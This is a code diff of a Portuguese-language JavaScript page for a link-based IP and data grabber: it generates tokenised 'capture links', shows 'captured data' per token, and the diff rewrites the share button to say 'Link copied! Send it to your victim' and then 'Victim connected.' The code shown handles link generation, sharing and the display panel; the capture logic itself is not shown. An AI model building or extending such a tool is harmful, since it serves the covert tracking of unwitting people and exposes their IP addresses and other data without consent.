@@ -314,32 +314,13 @@ function generateLink() {
   const container = document.getElementById('linksList');
   const div = document.createElement('div');
   div.innerHTML = `
-    <strong>Link:</strong> <a href="${link}" target="_blank" id="link-${token}">${link}</a>
-    <button onclick="shareLink('${token}')">Compartilhar Link</button><br>
+    <strong>Link:</strong> <a href="${link}" target="_blank">${link}</a><br>
     <button onclick="showCapturedData('${token}')">Mostrar Dados Capturados</button>
+    <button onclick="shareLink('${token}', this)">Compartilhar Link</button>
     <div id="data-${token}" style="margin-top: 5px; font-size: 0.9rem;"></div>
     <hr>
   `;
   container.appendChild(div);
-}
-
-// Função para compartilhar ou copiar link
-function shareLink(token) {
-  const link = `${location.origin}${location.pathname}?token=${token}`;
-
-  if (navigator.share) {
-    navigator.share({
-      title: 'Link de Captura',
-      text: 'Confira este link para captura de IP e dados:',
-      url: link,
-    }).catch(err => alert('Erro ao compartilhar: ' + err));
-  } else if (navigator.clipboard) {
-    navigator.clipboard.writeText(link)
-      .then(() => alert('Link copiado para a área de transferência!'))
-      .catch(() => alert('Não foi possível copiar o link.'));
-  } else {
-    alert('Compartilhamento não suportado neste navegador.');
-  }
 }
 
 // Mostrar dados capturados no painel
@@ -362,6 +343,36 @@ function showCapturedData(token) {
   });
 
   dataDiv.innerHTML = html;
+}
+
+// Função para compartilhar o link e mostrar mensagem sem redirecionar
+function shareLink(token, btn) {
+  const link = `${location.origin}${location.pathname}?token=${token}`;
+
+  if (navigator.share) {
+    navigator.share({
+      title: 'Link de Captura',
+      text: 'Confira este link para captura de IP e dados:',
+      url: link,
+    }).catch(err => alert('Erro ao compartilhar: ' + err));
+  } else if (navigator.clipboard) {
+    navigator.clipboard.writeText(link)
+      .then(() => {
+        const originalText = btn.textContent;
+        btn.textContent = 'Link copiado! Envie para sua vítima.';
+        btn.disabled = true;
+        setTimeout(() => {
+          btn.textContent = 'Vítima conectada.';
+          setTimeout(() => {
+            btn.textContent = originalText;
+            btn.disabled = false;
+          }, 3000);
+        }, 3000);
+      })
+      .catch(() => alert('Não foi possível copiar o link.'));
+  } else {
+    alert('Compartilhamento não suportado neste navegador.');
+  }
 }
 
 // Gerar PDF
